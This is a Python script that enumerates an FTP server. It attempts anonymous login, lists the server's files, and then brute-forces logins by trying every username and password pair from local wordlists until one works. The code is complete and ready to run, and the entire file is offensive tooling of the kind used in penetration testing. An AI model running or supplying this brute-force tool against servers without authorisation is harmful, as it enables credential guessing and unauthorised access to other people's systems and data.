#!/usr/bin/env python3
import sys
from ftplib import FTP, error_perm


def check_ftp_connection(ip_address, port):
    """Check if the FTP server is reachable."""
    try:
        ftp = FTP()
        ftp.connect(ip_address, int(port), timeout=10)
        print(f"[+] Connected to FTP server at {ip_address}:{port}")
        return ftp
    except Exception as e:
        print(f"[-] Failed to connect to FTP server at {ip_address}:{port} - {e}")
        return None


def try_anonymous_login(ftp):
    """Attempt anonymous login."""
    try:
        ftp.login()
        print("[+] Anonymous login successful!")
        return True
    except error_perm as e:
        print(f"[-] Anonymous login failed: {e}")
        return False


def list_ftp_directory(ftp):
    """List directory contents if accessible."""
    try:
        print("[+] Listing FTP directory contents:")
        files = ftp.nlst()
        for file in files:
            print(f"    {file}")
    except Exception as e:
        print(f"[-] Failed to list directory contents: {e}")


def brute_force_login(ip_address, port, user_list_path, password_list_path):
    """Perform brute force attack using provided user and password lists."""
    print("[+] Starting brute force attack...")

    try:
        with open(user_list_path, 'r') as user_file:
            user_list = [line.strip() for line in user_file if not line.startswith("#") and line.strip()]
    except FileNotFoundError:
        print(f"[-] User list file not found: {user_list_path}")
        return

    try:
        with open(password_list_path, 'r') as password_file:
            password_list = [line.strip() for line in password_file if not line.startswith("#") and line.strip()]
    except FileNotFoundError:
        print(f"[-] Password list file not found: {password_list_path}")
        return

    for user in user_list:
        for password in password_list:
            try:
                ftp = FTP()
                ftp.connect(ip_address, int(port), timeout=10)
                ftp.login(user, password)
                print(f"[+] Login successful - User: {user} | Password: {password}")
                ftp.quit()
                return  # Stop after first success
            except error_perm:
                continue
            except Exception as e:
                print(f"[-] Error during brute force attempt: {e}")
    print("[-] Brute force attack failed. No valid credentials found.")


def main():
    if len(sys.argv) != 3:
        print("Usage: python3 enum_ftp.py <ip address> <port>")
        sys.exit(1)

    ip_address = sys.argv[1].strip()
    port = sys.argv[2].strip()

    user_list_path = "modules/wordlists/usernames.txt"
    password_list_path = "modules/wordlists/ssh_passwd.txt"

    # Connect to FTP server
    ftp = check_ftp_connection(ip_address, port)
    if not ftp:
        return

    # Try anonymous login
    if try_anonymous_login(ftp):
        list_ftp_directory(ftp)
    ftp.quit()

    # Brute force login
    brute_force_login(ip_address, port, user_list_path, password_list_path)


if __name__ == "__main__":
    main()